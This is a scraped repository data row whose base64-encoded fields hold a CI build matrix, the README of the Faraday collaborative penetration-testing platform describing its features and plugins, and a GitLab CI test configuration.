UkFJTFM9My0xLXN0YWJsZSBBUkVMPTItMi1zdGFibGUgQURBUFRFUj1teXNx
bDIKICAgIC0gUkFJTFM9NC0yLXN0YWJsZSBBUkVMPTYtMC1zdGFibGUgQURB
UFRFUj1wb3N0Z3Jlc3FsCiAgICAtIFJBSUxTPTQtMS1zdGFibGUgQVJFTD01
LTAtc3RhYmxlIEFEQVBURVI9cG9zdGdyZXNxbAogICAgLSBSQUlMUz00LTAt
c3RhYmxlIEFSRUw9NC0wLXN0YWJsZSBBREFQVEVSPXBvc3RncmVzcWwKICAg
IC0gUkFJTFM9My0yLXN0YWJsZSBBUkVMPTMtMC1zdGFibGUgQURBUFRFUj1w
b3N0Z3Jlc3FsCiAgICAtIFJBSUxTPTMtMS1zdGFibGUgQVJFTD0yLTItc3Rh
YmxlIEFEQVBURVI9cG9zdGdyZXNxbAogICAgLSBSQUlMUz0zLTAtc3RhYmxl
IEFSRUw9Mi0wLXN0YWJsZSBBREFQVEVSPXBvc3RncmVzcWwK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'faraday',14160461,b'Collaborative Penetration Test and Vulnerability Management Platform',b'Python',60,2390,,2390,False,b'https://api.github.com/repos/infobyte/faraday/forks',"IyMgRG93bmxvYWQKClJlZmVyIHRvIHRoZSBbcmVsZWFzZXMgcGFnZV0oaHR0
cHM6Ly9naXRodWIuY29tL2luZm9ieXRlL2ZhcmFkYXkvcmVsZWFzZXMpIGZv
ciB0aGUgbGF0ZXN0IHByZS1tYWRlIGluc3RhbGxlcnMgZm9yIGFsbCBzdXBw
b3J0ZWQgb3BlcmF0aW5nIHN5c3RlbXMuCgojIyBBYm91dAoKRmFyYWRheSBp
bnRyb2R1Y2VzIGEgbmV3IGNvbmNlcHQgLSBJUEUgKEludGVncmF0ZWQgUGVu
ZXRyYXRpb24tVGVzdCBFbnZpcm9ubWVudCkgYSBtdWx0aXVzZXIgUGVuZXRy
YXRpb24gdGVzdCBJREUuIERlc2lnbmVkIGZvciBkaXN0cmlidXRpbmcsIGlu
ZGV4aW5nLCBhbmQgYW5hbHl6aW5nIHRoZSBkYXRhIGdlbmVyYXRlZCBkdXJp
bmcgYSBzZWN1cml0eSBhdWRpdC4KCj4gTWFkZSBmb3IgdHJ1ZSBwZW50ZXN0
ZXJzIQoKRmFyYWRheSB3YXMgbWFkZSB0byBsZXQgeW91IHRha2UgYWR2YW50
YWdlIG9mIHRoZSBhdmFpbGFibGUgdG9vbHMgaW4gdGhlIGNvbW11bml0eSBp
biBhIHRydWx5IG11bHRpdXNlciB3YXkuCgpEZXNpZ25lZCBmb3Igc2ltcGxp
Y2l0eSwgdXNlcnMgc2hvdWxkIG5vdGljZSBubyBkaWZmZXJlbmNlIGJldHdl
ZW4gdGhlaXIgb3duIHRlcm1pbmFsIGFwcGxpY2F0aW9uIGFuZCB0aGUgb25l
IGluY2x1ZGVkIGluIEZhcmFkYXkuIERldmVsb3BlZCB3aXRoIGEgc3BlY2lh
bGl6ZWQgc2V0IG9mIGZ1bmN0aW9uYWxpdGllcywgdXNlcnMgaW1wcm92ZSB0
aGVpciBvd24gd29yay4gRG8geW91IHJlbWVtYmVyIHRoZSBsYXN0IHRpbWUg
eW91IHByb2dyYW1tZWQgd2l0aG91dCBhbiBJREU/IFdoYXQgSURFcyBhcmUg
dG8gcHJvZ3JhbW1pbmcsIEZhcmFkYXkgaXMgdG8gcGVudGVzdGluZy4KCiFb
R1VJIC0gR1RLXShodHRwczovL3Jhdy5naXRodWIuY29tL3dpa2kvaW5mb2J5
dGUvZmFyYWRheS9pbWFnZXMvY2xpZW50L2d0a19tYWluX3dpbmRvdy5wbmcp
CgpGYXJhZGF5IGNydW5jaGVzIHRoZSBkYXRhIHlvdSBsb2FkIGludG8gZGlm
ZmVyZW50IHZpc3VhbGl6YXRpb25zIHRoYXQgYXJlIHVzZWZ1bCB0byBtYW5h
Z2VycyBhbmQgcGVudGVzdGVycyBhbGlrZS4KCiFbR1VJIC0gV2ViXShodHRw
czovL3Jhdy5naXRodWIuY29tL3dpa2kvaW5mb2J5dGUvZmFyYWRheS9pbWFn
ZXMvZGFzaGJvYXJkL2Rhc2hib2FyZC5wbmcpCgpUbyByZWFkIGFib3V0IHRo
ZSBsYXRlc3QgZmVhdHVyZXMgY2hlY2sgb3V0IHRoZSBbcmVsZWFzZSBub3Rl
c10oaHR0cHM6Ly9naXRodWIuY29tL2luZm9ieXRlL2ZhcmFkYXkvYmxvYi9t
YXN0ZXIvUkVMRUFTRS5tZCkhCgojIyBHZXR0aW5nIFN0YXJ0ZWQhCgpDaGVj
ayBvdXQgb3VyIGRvY3VtZW50YXRpb24gZm9yIGRldGFpbGVkIGluZm9ybWF0
aW9uIG9uIGhvdyB0byBpbnN0YWxsIEZhcmFkYXkgaW4gYWxsIG9mIG91ciBz
dXBwb3J0ZWQgcGxhdGZvcm1zOgoKIVtTdXBwb3J0ZWQgT3NdKGh0dHBzOi8v
cmF3LmdpdGh1Yi5jb20vd2lraS9pbmZvYnl0ZS9mYXJhZGF5L2ltYWdlcy9w
bGF0Zm9ybS9zdXBwb3J0ZWQucG5nKQoKVG8gYmVnaW4gdGhlIGluc3RhbGxh
dGlvbiBwcm9jZXNzLCBjaGVjayBvdXQgb3VyIFtJbnN0YWxsYXRpb24gV2lr
aV0oaHR0cHM6Ly9naXRodWIuY29tL2luZm9ieXRlL2ZhcmFkYXkvd2lraS9J
bnN0YWxsYXRpb24tQ29tbXVuaXR5KS4KCiMjIE5ldyBGZWF0dXJlcyEKQWxs
IG9mIEZhcmFkYXkncyBsYXRlc3QgZmVhdHVyZXMgYW5kIHVwZGF0ZXMgYXJl
IGFsd2F5cyBhdmFpbGFibGUgb24gb3VyIFtibG9nXShodHRwOi8vYmxvZy5p
bmZvYnl0ZXNlYy5jb20vc2VhcmNoL2xhYmVsL2VuZ2xpc2gpLgpUaGVyZSBh
cmUgbmV3IGVudHJpZXMgZXZlcnkgZmV3IHdlZWtzLCBkb24ndCBmb3JnZXQg
dG8gY2hlY2sgb3V0IG91ciBhbWF6aW5nIG5ldyBpbXByb3ZlbWVudHMgb24g
aXQncyBsYXN0IGVudHJ5IQoKCiMjIFBsdWdpbnMgbGlzdAoKWW91IGZlZWQg
ZGF0YSB0byBGYXJhZGF5IGZyb20geW91ciBmYXZvcml0ZSB0b29scyB0aHJv
dWdoIFBsdWdpbnMuIFJpZ2h0IG5vdyB0aGVyZSBhcmUgbW9yZSB0aGFuIFs3
MCsgc3VwcG9ydGVkIHRvb2xzXShodHRwczovL2dpdGh1Yi5jb20vaW5mb2J5
dGUvZmFyYWRheS93aWtpL1BsdWdpbi1MaXN0KSwgYW1vbmcgd2hpY2ggeW91
IHdpbGwgZmluZDoKCiFbXShodHRwczovL3Jhdy5naXRodWIuY29tL3dpa2kv
aW5mb2J5dGUvZmFyYWRheS9pbWFnZXMvcGx1Z2lucy9QbHVnaW5zLnBuZykK
ClRoZXJlIGFyZSB0aHJlZSBQbHVnaW4gdHlwZXM6ICoqY29uc29sZSoqIHBs
dWdpbnMgd2hpY2ggaW50ZXJjZXB0IGFuZCBpbnRlcnByZXQgdGhlIG91dHB1
dCBvZiB0aGUgdG9vbHMgeW91IGV4ZWN1dGUsICoqcmVwb3J0KiogcGx1Z2lu
cyB3aGljaCBhbGxvd3MgeW91IHRvIGltcG9ydCBwcmV2aW91c2x5IGdlbmVy
YXRlZCBYTUxzLCBhbmQgKipvbmxpbmUqKiBwbHVnaW5zIHdoaWNoIGFjY2Vz
cyBGYXJhZGF5J3MgQVBJIG9yIGFsbG93IEZhcmFkYXkgdG8gY29ubmVjdCB0
byBleHRlcm5hbCBBUElzIGFuZCBkYXRhYmFzZXMuCgpbUmVhZCBtb3JlIGFi
b3V0IFBsdWdpbnNdKGh0dHA6Ly9naXRodWIuY29tL2luZm9ieXRlL2ZhcmFk
YXkvd2lraS9QbHVnaW4tTGlzdCkuCgojIyBGZWF0dXJlcwoKIyMjIFdvcmtz
cGFjZXMKSW5mb3JtYXRpb24gaXMgb3JnYW5pemVkIGludG8gdmFyaW91cyAq
KldvcmtzcGFjZXMqKi4gRWFjaCBXb3Jrc3BhY2UgY29udGFpbnMgYSBwZW50
ZXN0IHRlYW0ncyBhc3NpZ25tZW50cyBhbmQgYWxsIHRoZSBpbnRlbCB0aGF0
IGlzIGRpc2NvdmVyZWQuCgojIyMgQ29uZmxpY3RzCklmIHR3byBwbHVnaW5z
IHByb2R1Y2UgY2xhc2hpbmcgaW5mb3JtYXRpb24gZm9yIGFuIGluZGl2aWR1
YWwgZWxlbWVudCwgYSBjb25mbGljdCB0aGF0IHRoZSB1c2VyIHdpbGwgaGF2
ZSB0byByZXNvbHZlIGlzIGdlbmVyYXRlZC4gIEFuIGV4YW1wbGUgaXMgaWYg
Kip1c2VyMSoqIGluY29ycG9yYXRlcyBob3N0ICoxMjcuMC4wLjEgT1M6TGlu
dXgqIGFuZCAqKnVzZXIyKiogaW5jb3Jwb3JhdGVzICoxMjcuMC4wLjEgT1M6
IExpbnV4IFVidW50dSAxMy4xMCouCgpPbiBvdXIgW0dUSyBpbnRlcmZhY2Vd
KGh0dHBzOi8vZ2l0aHViLmNvbS9pbmZvYnl0ZS9mYXJhZGF5L3dpa2kvVXNh
Z2UjZ3RrLWd1aSkgdGhlcmUncyBhIGJ1dHRvbiBvbiB0aGUgYm90dG9tIHJp
Z2h0IGNvcm5lciBvZiB0aGUgbWFpbiB3aW5kb3cgZGlzcGxheWluZyB0aGUg
bnVtYmVyIG9mIGNvbmZsaWN0cyBpbiB0aGUgY3VycmVudCB3b3Jrc3BhY2Uu
IFRvIHJlc29sdmUgdGhlbSwganVzdCBjbGljayBvbiB0aGUgYnV0dG9uIGFu
ZCBhIHdpbmRvdyB3aWxsIG9wZW4gd2hlcmUgeW91IGNhbiBlZGl0IHRoZSBj
b25mbGljdGluZyBvYmplY3RzIGFuZCBzZWxlY3Qgd2hpY2ggb25lIHRvIGtl
ZXAuCgojIyMgRmFyYWRheSBwbHVnaW4KClVzaW5nIG91ciBwbHVnaW4geW91
IGNhbiBwZXJmb3JtIHZhcmlvdXMgYWN0aW9ucyB1c2luZyB0aGUgY29tbWFu
ZCBsaW5lLCBmb3IgZXhhbXBsZToKCiAgICAkIGNkIGZhcmFkYXktZGV2L2Jp
bi8KICAgICQgLi9mcGx1Z2luIGNyZWF0ZV9ob3N0IDE5Mi4xNTQuMzMuMjIy
IEFuZHJvaWQKICAgIDFhN2IyOTgxYzdiZWNiY2IzZDUzMTgwNTZlYjI5YTU4
ODE3ZjVlNjcKICAgICQgLi9mcGx1Z2luIGZpbHRlcl9zZXJ2aWNlcyBodHRw
IHNzaCAtcCAyMSAtYQogICAgRmlsdGVyaW5nIHNlcnZpY2VzIGZvciBwb3J0
czogMjEsIDIyLCA4MCwgNDQzLCA4MDgwLCA4NDQzCgogICAgMTkyLjE2OC4y
MC4xICAgIHNzaCAgICAgWzIyXSAgICB0Y3Agb3BlbiAgICBOb25lCiAgICAx
OTIuMTY4LjIwLjEgICAgaHR0cCAgICBbNDQzXSAgIHRjcCBvcGVuICAgIE5v
bmUKICAgIDE5Mi4xNjguMjAuNyAgICBzc2ggICAgIFsyMl0gICAgdGNwIG9w
ZW4gICAgTGludXgKICAgIDE5Mi4xNjguMjAuNyAgICBodHRwICAgIFs0NDNd
ICAgdGNwIG9wZW4gICAgTGludXgKICAgIDE5Mi4xNjguMjAuMTEgICBzc2gg
ICAgIFsyMl0gICAgdGNwIG9wZW4gICAgTGludXgKCgpSZWFkIG1vcmUgYWJv
dXQgdGhlIFtGYXJhZGF5IFBsdWdpbl0oaHR0cHM6Ly9naXRodWIuY29tL2lu
Zm9ieXRlL2ZhcmFkYXkvd2lraS9mYXJhZGF5LXBsdWdpbikuCgojIyMgTm90
aWZpY2F0aW9ucwpVcGRhdGluZyBvYmplY3RzIG9uIG90aGVyIEZhcmFkYXkg
aW5zdGFuY2VzIHJlc3VsdCBpbiBub3RpZmljYXRpb25zIG9uIHlvdXIKRmFy
YWRheSBHVEsgQ2xpZW50LgoKIVtdKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20v
d2lraS9pbmZvYnl0ZS9mYXJhZGF5L2ltYWdlcy9jbGllbnQvZ3RrX25vdGlm
aWNhdGlvbnNfZGlhbG9nLnBuZykKCgojIyMgQ1NWIEV4cG9ydGluZwpGYXJh
ZGF5IHN1cHBvcnRzIENTViBFeHBvcnRpbmcgZnJvbSBpdHMgV0VCIFVJLgpb
TW9yZSBpbmZvcm1hdGlvbl0oRXhwb3J0aW5nLXRoZS1pbmZvcm1hdGlvbikK
CiMjIExpbmtzCgoqIEhvbWVwYWdlOiBodHRwczovL3d3dy5mYXJhZGF5c2Vj
LmNvbQoqIFVzZXIgZm9ydW06IGh0dHBzOi8vZm9ydW0uZmFyYWRheXNlYy5j
b20KKiBVc2VyJ3MgbWFudWFsOiBodHRwczovL2dpdGh1Yi5jb20vaW5mb2J5
dGUvZmFyYWRheS93aWtpCiogRG93bmxvYWQ6IFsudGFyLmd6XShodHRwczov
L2dpdGh1Yi5jb20vaW5mb2J5dGUvZmFyYWRheS90YXJiYWxsL21hc3RlcikK
KiBDb21taXRzIFJTUyBmZWVkOiBodHRwczovL2dpdGh1Yi5jb20vaW5mb2J5
dGUvZmFyYWRheS9jb21taXRzL21hc3Rlci5hdG9tCiogSXNzdWUgdHJhY2tl
cjogaHR0cHM6Ly9naXRodWIuY29tL2luZm9ieXRlL2ZhcmFkYXkvaXNzdWVz
CiogRnJlcXVlbnRseSBBc2tlZCBRdWVzdGlvbnMgKEZBUSk6IGh0dHBzOi8v
Z2l0aHViLmNvbS9pbmZvYnl0ZS9mYXJhZGF5L3dpa2kvRkFRCiogTWFpbGlu
ZyBsaXN0IHN1YnNjcmlwdGlvbjogaHR0cHM6Ly9ncm91cHMuZ29vZ2xlLmNv
bS9mb3J1bS8jIWZvcnVtL2ZhcmFkYXlzZWMKKiBUd2l0dGVyOiBbQGZhcmFk
YXlzZWNdKGh0dHBzOi8vdHdpdHRlci5jb20vZmFyYWRheXNlYykKKiBbRGVt
b3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9pbmZvYnl0ZS9mYXJhZGF5L3dpa2kv
RGVtb3MpCiogSVJDOiBbaXJjczovL2lyYy5mcmVlbm9kZS5uZXQvZmFyYWRh
eS1kZXZdKGlyY3M6Ly9pcmMuZnJlZW5vZGUubmV0L2ZhcmFkYXktZGV2KSBb
V2ViQ2xpZW50XShodHRwczovL3dlYmNoYXQuZnJlZW5vZGUubmV0Lz9uaWNr
PXdpa2l1c2VyJmNoYW5uZWxzPWZhcmFkYXktZGV2JnByb21wdD0xJnVpbz1k
NCkKKiBTY3JlZW5zaG90czogaHR0cHM6Ly9naXRodWIuY29tL2luZm9ieXRl
L2ZhcmFkYXkvd2lraS9TY3JlZW5zaG90cwoqIFNlbmQgeW91ciBpZGVhcyBh
bmQgc3VnZ2VzdGlvbnMgaGVyZTogW2h0dHBzOi8vd3d3LmZhcmFkYXlzZWMu
Y29tL2lkZWFzXShodHRwczovL3d3dy5mYXJhZGF5c2VjLmNvbS9pZGVhcykK
KiBSZWxlYXNlczogW0ZhcmFkYXkgUmVsZWFzZXNdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9pbmZvYnl0ZS9mYXJhZGF5L3JlbGVhc2VzLykKCiMjIFByZXNlbnRh
dGlvbnMKCiogRWtvcGFydHkgIVtdKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20v
d2lraS9pbmZvYnl0ZS9mYXJhZGF5L2ltYWdlcy9mbGFncy9hcmdlbnRpbmEu
cG5nKToKICAgIFsyMDEwXShodHRwOi8vdmltZW8uY29tLzE2NTE2OTg3KSAt
CiAgICBbMjAxNF0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1f
ajBUMlM2UHBmbykgLQogICAgWzIwMTddKGh0dHA6Ly9ibG9nLmluZm9ieXRl
c2VjLmNvbS8yMDE3LzEwL2Vrb3BhcnR5LTIwMTctcmV2aWV3XzIzLmh0bWwp
IC0KICAgIFsyMDE4XShodHRwOi8vYmxvZy5pbmZvYnl0ZXNlYy5jb20vMjAx
OC8xMC9la29wYXJ0eS0yMDE4LXJldmlld18xOC5odG1sKQoKKiBCbGFjayBI
YXQ6CiAgICAqIFVTQSAhW10oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS93aWtp
L2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdzL3VzYS5wbmcpOgogICAg
ICAgIFsyMDExXShodHRwOi8vd3d3LmluZm9ieXRlc2VjLmNvbS9kb3duL0Zh
cmFkYXlfQkgyMDExX0Fyc2VuYWwucGRmKSAtCiAgICAgICAgWzIwMTVdKGh0
dHBzOi8vd3d3LmJsYWNraGF0LmNvbS91cy0xNS9hcnNlbmFsLmh0bWwjZmFy
YWRheSkgLQogICAgICAgIFsyMDE2XShodHRwczovL3d3dy5ibGFja2hhdC5j
b20vdXMtMTYvYXJzZW5hbC5odG1sI2ZhcmFkYXkpIC0KICAgICAgICBbMjAx
N10oaHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL3VzLTE3L2V2ZW50LXNwb25z
b3JzLmh0bWwjZmFyYWRheSkgLQogICAgICAgIFsyMDE4XShodHRwczovL3d3
dy5ibGFja2hhdC5jb20vdXMtMTgvZXZlbnQtc3BvbnNvcnMuaHRtbCNmYXJh
ZGF5KQoKICAgICogQXNpYSAhW10oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS93
aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdzL3NpbmdhcG9yZS5w
bmcpOgogICAgICAgIFsyMDE2XShodHRwczovL3d3dy5ibGFja2hhdC5jb20v
YXNpYS0xNi9hcnNlbmFsLmh0bWwjZmFyYWRheSkgLQogICAgICAgIFsyMDE3
XShodHRwczovL3d3dy5ibGFja2hhdC5jb20vYXNpYS0xNy9hcnNlbmFsLmh0
bWwjZmFyYWRheSkgLQogICAgICAgIFsyMDE4XShodHRwczovL3d3dy5ibGFj
a2hhdC5jb20vYXNpYS0xOC9hcnNlbmFsLmh0bWwjZmFyYWRheS12My1jb2xs
YWJvcmF0aXZlLXBlbmV0cmF0aW9uLXRlc3QtYW5kLXZ1bG5lcmFiaWxpdHkt
bWFuYWdlbWVudC1wbGF0Zm9ybSkKCiAgICAqIEV1cm9wZSAhW10oaHR0cHM6
Ly9yYXcuZ2l0aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2Vz
L2ZsYWdzL2V1cm9wZS5wbmcpOgogICAgICAgIFsyMDE1XShodHRwczovL3d3
dy5ibGFja2hhdC5jb20vZXUtMTUvYXJzZW5hbC5odG1sI2ZhcmFkYXkpIC0K
ICAgICAgICBbMjAxNl0oaHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2V1LTE2
L2Fyc2VuYWwuaHRtbCNmYXJhZGF5KQoKKiBSU0EgVVNBICFbXShodHRwczov
L3Jhdy5naXRodWIuY29tL3dpa2kvaW5mb2J5dGUvZmFyYWRheS9pbWFnZXMv
ZmxhZ3MvdXNhLnBuZyk6CiAgICBbMjAxNV0oaHR0cHM6Ly93d3cucnNhY29u
ZmVyZW5jZS5jb20vZXZlbnRzL3VzMTUvZXhwby1zcG9uc29ycy9leGhpYml0
b3ItbGlzdC8xNzgyL2luZm9ieXRlLWxsYykKCiogSElUQlNlY0NvbmYgRHVi
YWkgIVtdKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20vd2lraS9pbmZvYnl0ZS9m
YXJhZGF5L2ltYWdlcy9mbGFncy91YWUucG5nKToKICAgWzIwMThdKGh0dHBz
Oi8vY29uZmVyZW5jZS5oaXRiLm9yZy9oaXRic2VjY29uZjIwMThkeGIvaGl0
Yi1hcm1vcnkvKQoKKiBTZWN1cml0eVdlZWtseSAhW10oaHR0cHM6Ly9yYXcu
Z2l0aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdz
L3VzYS5wbmcpOgogICBbMjAxNl0oaHR0cDovL3NlY3VyaXR5d2Vla2x5LmNv
bS8yMDE2LzA4LzAyL3NlY3VyaXR5LXdlZWtseS00NzUtZmVkZXJpY28ta2ly
c2NoYmF1bS8pCgoqIFplcm8gTmlnaHRzICFbXShodHRwczovL3Jhdy5naXRo
dWIuY29tL3dpa2kvaW5mb2J5dGUvZmFyYWRheS9pbWFnZXMvZmxhZ3MvcnVz
c2lhLnBuZyk6CiAgIFsyMDE2XShodHRwczovL3d3dy5zbGlkZXNoYXJlLm5l
dC9BbGV4YW5kZXJMZW9ub3YyL2VudGVycHJpc2UtdnVsbmVyYWJpbGl0eS1t
YW5hZ2VtZW50LXplcm9uaWdodHMxNikKCiogQVZUb2t5byAhW10oaHR0cHM6
Ly9yYXcuZ2l0aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2Vz
L2ZsYWdzL2phcGFuLnBuZyk6CiAgICBbMjAxNl0oaHR0cDovL2VuLmF2dG9r
eW8ub3JnL2F2dG9reW8yMDE2L2V2ZW50KSAtCiAgICBbMjAxOF0oaHR0cDov
L2VuLmF2dG9reW8ub3JnL2F2dG9reW8yMDE4L2V2ZW50KQoKKiBUZWwgQXZp
di1ZYWZvICFbXShodHRwczovL3Jhdy5naXRodWIuY29tL3dpa2kvaW5mb2J5
dGUvZmFyYWRheS9pbWFnZXMvZmxhZ3MvaXNyYWVsLnBuZyk6CiAgIFsyMDE4
XShodHRwczovL3d3dy5tZWV0dXAuY29tL2luZm9ieXRlL2V2ZW50cy8yNTQw
MzE2NzEvKQoKKiBTRUNDT04gIVtdKGh0dHBzOi8vcmF3LmdpdGh1Yi5jb20v
d2lraS9pbmZvYnl0ZS9mYXJhZGF5L2ltYWdlcy9mbGFncy9qYXBhbi5wbmcp
OgogICBbMjAxOF0oaHR0cHM6Ly8yMDE4LnNlY2Nvbi5qcC9zZWNjb24veW9y
b3p1MjAxOC5odG1sKQoKCiogUHlDb25BciAhW10oaHR0cHM6Ly9yYXcuZ2l0
aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdzL2Fy
Z2VudGluYS5wbmcpOgogICBbMjAxOF0oaHR0cHM6Ly9ldmVudG9zLnB5dGhv
bi5vcmcuYXIvZXZlbnRzL3B5Y29uYXIyMDE4L2FjdGl2aXR5Lzc1LykKCiog
OC44IENoaWxlICFbXShodHRwczovL3Jhdy5naXRodWIuY29tL3dpa2kvaW5m
b2J5dGUvZmFyYWRheS9pbWFnZXMvZmxhZ3MvY2hpbGUucG5nKToKICAgWzIw
MThdKGh0dHA6Ly9ibG9nLmluZm9ieXRlc2VjLmNvbS8yMDE4LzExL2Nocm9u
aWNsZXMtb2YtdHJpcC10by1zYW50aWFnby04OC1yZXZpZXcuaHRtbCkKCiog
Q2hhcnJ1YUNvbiAhW10oaHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS93aWtpL2lu
Zm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdzL3VydWd1YXkucG5nKToKICAg
WzIwMThdKGh0dHBzOi8vY2hhcnJ1YS5vcmcvcHJlc2VudGFjaW9uZXMyMDE4
L0xvdmVfaXNfaW5fdGhlX2Fpcl9fUmV2ZXJzZV9FbmdpbmVlcmluZ19hX2hp
dHR5X2Ryb25lLnBkZikKCiogTm90UGlua0NvbiAhW10oaHR0cHM6Ly9yYXcu
Z2l0aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdz
L2FyZ2VudGluYS5wbmcpOgogICBbMjAxOF0oaHR0cHM6Ly90d2l0dGVyLmNv
bS9Ob3RQaW5rQ29uKQoKKiBwbHVzQ09ERSAhW10oaHR0cHM6Ly9yYXcuZ2l0
aHViLmNvbS93aWtpL2luZm9ieXRlL2ZhcmFkYXkvaW1hZ2VzL2ZsYWdzL2Fy
Z2VudGluYS5wbmcpOgogICBbMjAxOF0oaHR0cDovL3BsdXNjb2RlLmNjL3Bv
cnRmb2xpb19wYWdlL2ludHJvZHVjY2lvbi1wcmFjdGljYS1hbC1oYXJkd2Fy
ZS1oYWNraW5nLykKCiogQlNpZGVzIExBVEFNICFbXShodHRwczovL3Jhdy5n
aXRodWIuY29tL3dpa2kvaW5mb2J5dGUvZmFyYWRheS9pbWFnZXMvZmxhZ3Mv
YnJhemlsLnBuZyk6CiAgIFsyMDE2XShodHRwOi8vd3d3LmluZm9ieXRlc2Vj
LmNvbS9kb3duL0ZhcmFkYXlfQnNpZGVMYXRhbV8yMDE2LnBkZikK
",,,,,,,,,,,,,,,,,,,,,,,,,,"dmFyaWFibGVzOgogICAgVFo6ICJBbWVyaWNhL05ld19Zb3JrIgogICAgIyBD
b25maWd1cmUgcG9zdGdyZXMgc2VydmljZSAoaHR0cHM6Ly9odWIuZG9ja2Vy
LmNvbS9fL3Bvc3RncmVzLykKICAgIFBPU1RHUkVTX0RCOiBjdXN0b21fZGIK
ICAgIFBPU1RHUkVTX1VTRVI6IGN1c3RvbV91c2VyCiAgICBQT1NUR1JFU19Q
QVNTV09SRDogY3VzdG9tX3Bhc3MKICAgIFBJUF9DQUNIRV9ESVI6ICIkQ0lf
UFJPSkVDVF9ESVIvLmNhY2hlL3BpcCIKICAgIEFQVF9DQUNIRV9ESVI6ICIk
Q0lfUFJPSkVDVF9ESVIvYXB0LWNhY2hlIgogICAgREVCSUFOX0ZST05URU5E
OiBub25pbnRlcmFjdGl2ZQogICAgSU1BR0VfVEFHOiAnL2Jpbi9lZ3JlcCAt
byAiWzAtOV1cLlswLTldXC5bMC05XSIgZmFyYWRheS9fX2luaXRfXy5weScK
ICAgICMjIEVOVl9WQVJTIExJU1QKICAgICMgRlVMTF9URVNUID0gVGVzdCBh
bGwgam9icwogICAgIyBCVUlMRF9URVNUID0gVGVzdCBkZWZhdWx0IGFuZCBi
dWlsZCBqb2JzCiAgICAjIERBSUxZX1RFU1QgPSBSdW4gZXZlcnkgbmlnaHQg
YXQgMDMgYW0KCmNhY2hlOgogIHBhdGhzOgogICAgLSAiJENJX1BST0pFQ1Rf
RElSLy5jYWNoZS9waXAiCiAgICAtICIkQ0lfUFJPSkVDVF9ESVIvYXB0LWNh
Y2hlIgoKYmVmb3JlX3NjcmlwdDoKICAgIC0gbWtkaXIgLXB2ICRBUFRfQ0FD
SEVfRElSCgpzdGFnZXM6CiAgICAtIHByZV90ZXN0aW5nCiAgICAtIHRlc3Rp
bmcKICAgIC0gcG9zdF90ZXN0aW5nCiAgICAtIGJ1aWxkX2ZhcmFkYXkKICAg
IC0gYnVpbGQKCnNlcnZpY2VzOgogICAgLSBwb3N0Z3JlczpsYXRlc3QKCmNs
b3N1cmVfY29tcGlsZXI6CiAgICB0YWdzOgogICAgICAgIC0gZmFyYWRheXRl
c3RzCiAgICBpbWFnZToKICAgICAgICBuYW1lOiBqYm9yemEvY2xvc3VyZS1j
b21waWxlcgogICAgICAgIGVudHJ5cG9pbnQ6IFsiL2Jpbi9zaCIsICItYyJd
CgogICAgc3RhZ2U6IHByZV90ZXN0aW5nCiAgICBzY3JpcHQ6CiAgICAgICAg
LSAvb3B0L2NjLnNoIGZhcmFkYXkvc2VydmVyL3d3dy9zY3JpcHRzCiAgICBl
eGNlcHQ6CiAgICAgICAgdmFyaWFibGVzOgogICAgICAgICAgICAtICRCVUlM
RF9URVNUCgptZXJnZV9jb25mbGljdF9jaGVjazoKICAgIHRhZ3M6CiAgICAg
ICAgLSBmYXJhZGF5dGVzdHMKICAgIGltYWdlOiBweXRob246MwogICAgc3Rh
Z2U6IHByZV90ZXN0aW5nCiAgICBhbGxvd19mYWlsdXJlOiB0cnVlCiAgICBz
Y3JpcHQ6CiAgICAgICAgLSBnaXQgY29uZmlnIC0tZ2xvYmFsIHVzZXIuZW1h
aWwgInlvdUBleGFtcGxlLmNvbSIKICAgICAgICAtIGdpdCBjb25maWcgLS1n
bG9iYWwgdXNlci5uYW1lICJNZXJnZXJib3QiCiAgICAgICAgLSBweXRob24z
IG1lcmdlLWNvbmZsaWN0LWRldGVjdG9yLnB5CiAgICBleGNlcHQ6CiAgICAg
ICAgdmFyaWFibGVzOgogICAgICAgICAgICAtICRCVUlMRF9URVNUCgpweWxp
bnQ6CiAgICB0YWdzOgogICAgICAgIC0gZmFyYWRheXRlc3RzCiAgICBpbWFn
ZTogcmVnaXN0cnkuZ2l0bGFiLmNvbS9mYXJhZGF5c2VjL2ZhcmFkYXkvZmFy
YWRheV90ZXN0aW5nX2Jhc2UgICMgSSBqdXN0IG5lZWQgYW4gaW1hZ2Ugd2l0
aCBweXRob24tZGV2IGFuZCBweXRob24tcGlwCiAgICBzdGFnZTogcHJlX3Rl
c3RpbmcKICAgIHNjcmlwdDoKICAgICAgICAtIGFwdC1nZXQgdXBkYXRlIC1x
eQogICAgICAgIC0gYXB0LWdldCBpbnN0YWxsIC15IC1vIGRpcjo6Y2FjaGU6
OmFyY2hpdmVzPSIkQVBUX0NBQ0hFX0RJUiIgYnVpbGQtZXNzZW50aWFsIGlw
eXRob24gcHl0aG9uLXNldHVwdG9vbHMgcHl0aG9uLXBpcCBweXRob24tZGV2
